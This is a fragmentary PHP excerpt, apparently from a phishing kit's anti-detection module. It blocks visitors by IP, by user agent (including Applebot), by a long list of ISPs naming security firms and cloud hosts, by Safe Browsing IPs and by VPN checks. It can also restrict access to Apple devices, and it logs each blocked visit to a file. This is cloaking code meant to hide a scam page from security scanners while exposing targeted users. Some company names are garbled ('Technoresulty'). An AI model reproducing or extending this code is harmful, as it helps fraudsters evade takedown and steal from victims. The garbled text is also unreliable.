...
if($config['block_iprange'] == "on") {
    if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
              $ip = getUserIP();
              tulis_file("result/block_bot.tx","BLOCKED IP RANGE || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
...
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
        $ip = getUserIP();
        tulis_file("result/block_bot.tx","BLOCKED USER AGENT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
...
$banned_isp = array(
    ...
    'Cisco Systems',
    'Network and Information Technoresulty Limited',
    'London Wires Ltd.',
    'Tehnoresultii Budushego LLC',
    'Eonix Corporation',
    'hosttech GmbH',
    'Wowrack.com',
    ...
    'Palo Alto Networks',
    'PlusNet Technoresulties Ltd',
    'Scaleway',
    'Facebook',
    'Host1Plus',
    'XO Communications',
    'Nobis Technoresulty Group',
    'ExpressVPN',
    'DME Hosting LLC',
    'Prescient Software',
    ...
    'Digital Energy Technoresulties Limited',
    'Private Customer',
    'Cisco Systems Inc.',
    'Vultr Holdings LLC',
    'Amazon.com Inc.',
...
if($config['block_isp'] == "on"){
    foreach ($banned_isp as $isps) {
        if (substr_count($ispnya, $isps) > 0) {
          tulis_file("result/block_bot.tx","BLOCKED ISP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
...
if($ip == "92.23.57.168" or $ip == "96.31.1.4" or $ip == "207.96.148.8") {
  tulis_file("result/block_bot.tx","BLOCKED SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
...
if($config['lock_platform'] == "on") {
    if($os == "iPhone" or $os == "iPad" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
      ...
      tulis_file("result/block_bot.tx","BLOCKED LOCK PLATFORM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
...
if($config['block_vpn'] == 'on') {
    if($ip == "127.0.0.1") {
        ...
        $result = $resp;
        if($result == "Y") {
            tulis_file("result/block_bot.tx","BLOCKED VPN/PROXY || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
